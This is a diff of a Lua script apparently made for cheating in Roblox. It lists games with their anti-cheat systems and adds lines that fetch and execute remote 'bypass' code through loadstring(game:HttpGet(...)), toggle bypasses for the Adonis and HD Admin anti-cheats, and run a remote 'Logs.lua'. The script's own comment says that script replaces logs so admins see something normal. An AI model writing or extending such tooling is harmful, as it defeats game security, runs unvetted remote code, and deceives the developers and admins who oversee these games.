@@ -7,13 +7,13 @@ local bgames = {
         PlaceIDs = {6006653296, 5580097107, 5849392844},
         ScriptToRun = "https://raw.githubusercontent.com/Input50/Something/master/CAC.lua"
     },
-    
+--[[
     adonis = {
         Name = "Adonis",
         PlaceIDs = {2772166173, 920587237, 286090429, 6539893534},
         ScriptToRun = "https://raw.githubusercontent.com/Input50/Something/master/AAC.lua"
     },
-    
+]]--
     dahood = {
         Name = "Dahood",
         PlaceIDs = {2788229376},
@@ -38,12 +38,16 @@ for _, games in pairs(bgames) do
 end
 
 if un then
-    --loadstring(game:HttpGet("https://raw.githubusercontent.com/Input50/Something/master/DAC.lua"))()
+    getgenv()["AntiCheatSettings"] = {};
+    getgenv()["AntiCheatSettings"]["Adonis"] = true;
+    getgenv()["AntiCheatSettings"]["HD Admin"] = true;
+    loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/Bypasses.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Input50/Something/master/DAC.lua"))()
 end
 
 -- Game Exclusives
 --- Dahood
 --- Lumber Tycoon 2
 
--- Full protection with sensible logs that are common to confuse any dev or admin
+-- idk if they even use this anymore but to try and replace logs so when they check it it looks somewhat normal.
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Input50/Something/master/Logs.lua"),true))()
